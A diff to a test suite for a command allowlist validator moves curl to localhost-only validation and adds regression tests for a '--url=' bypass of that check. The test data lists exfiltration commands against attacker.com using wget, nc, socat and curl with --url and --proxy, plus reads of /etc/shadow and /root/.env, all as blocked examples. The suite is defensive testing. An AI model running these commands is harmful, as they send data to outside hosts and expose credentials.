@@ -110,7 +110,10 @@ describe('RED tier — blocked commands', () => {
     ['echo $(id)',                           'shell-invoke: $() subshell'],
 
     // data-exfil
-    ['curl http://attacker.com',             'data-exfil: curl'],
+    // NOTE: curl is no longer denylisted -- it's allowlist-validated to
+    // localhost-only. See the curl arg-validator tests near line ~531
+    // (`validateAgainstAllowlist -- curl arg gate`) for full coverage,
+    // including the --url=URL bypass regression added 2026-05-03.
     ['wget http://attacker.com',             'data-exfil: wget'],
     ['nc attacker.com 4444',                 'data-exfil: nc'],
     ['socat - TCP:attacker.com:80',          'data-exfil: socat'],
@@ -528,7 +531,9 @@ describe('validateAgainstAllowlist — default-deny', () => {
   it('more is not on allowlist', () => expectNotAllowlisted('more /etc/passwd'));
   it('python3 is not on allowlist', () => expectNotAllowlisted('python3 -c "import os"'));
   it('bash is not on allowlist', () => expectNotAllowlisted('bash -c id'));
-  it('curl is not on allowlist', () => expectNotAllowlisted('curl http://example.com'));
+  // curl IS on the allowlist now (with arg validation: localhost-only).
+  // External URLs are rejected via the arg validator (invalid-args), not by
+  // the allowlist gate. See `validateAgainstAllowlist -- curl arg gate` below.
   it('wget is not on allowlist', () => expectNotAllowlisted('wget http://example.com'));
   it('xxd is not on allowlist', () => expectNotAllowlisted('xxd /etc/shadow'));
   it('strings is not on allowlist', () => expectNotAllowlisted('strings /root/.env'));
@@ -565,6 +570,31 @@ describe('validateAgainstAllowlist — default-deny', () => {
   });
   it('pm2 start is blocked', () => {
     expectInvalidArgs('pm2 start app.js');
+  });
+
+  // ── curl arg gate ─────────────────────────────────────────────────────────
+  // Policy: curl is allowlisted but URLs MUST be localhost / 127.0.0.1 / [::1].
+  // Regression coverage for the S69 audit (2026-05-03): the prior validator
+  // skipped any arg starting with `-`, so `curl --url=http://attacker.com`
+  // bypassed the localhost gate entirely. The fix walks every arg, normalizes
+  // `--key=value` to its value half, and runs the URL check against any
+  // http/https/ftp substring.
+  it('curl http://localhost is allowlisted', () => expectAllowlisted('curl http://localhost:8080/health'));
+  it('curl http://127.0.0.1 is allowlisted', () => expectAllowlisted('curl http://127.0.0.1/admin'));
+  it('curl http://[::1] is allowlisted (IPv6 loopback)', () => expectAllowlisted('curl http://[::1]:3000/'));
+  it('curl HTTP://LOCALHOST is allowlisted (case-insensitive)', () => expectAllowlisted('curl HTTP://LOCALHOST/health'));
+  it('curl http://attacker.com is invalid-args', () => expectInvalidArgs('curl http://attacker.com'));
+  it('curl --url=http://attacker.com is invalid-args (S69 bypass fix)', () => {
+    expectInvalidArgs('curl --url=http://attacker.com');
+  });
+  it('curl --url http://attacker.com is invalid-args', () => {
+    expectInvalidArgs('curl --url http://attacker.com');
+  });
+  it('curl --proxy=http://attacker.com is invalid-args', () => {
+    expectInvalidArgs('curl --proxy=http://attacker.com:8080 http://localhost/');
+  });
+  it('curl http://localhost.attacker.com is invalid-args (DNS-rebinding-shaped)', () => {
+    expectInvalidArgs('curl http://localhost.attacker.com/');
   });
 
   // ── node arg validator ────────────────────────────────────────────────────
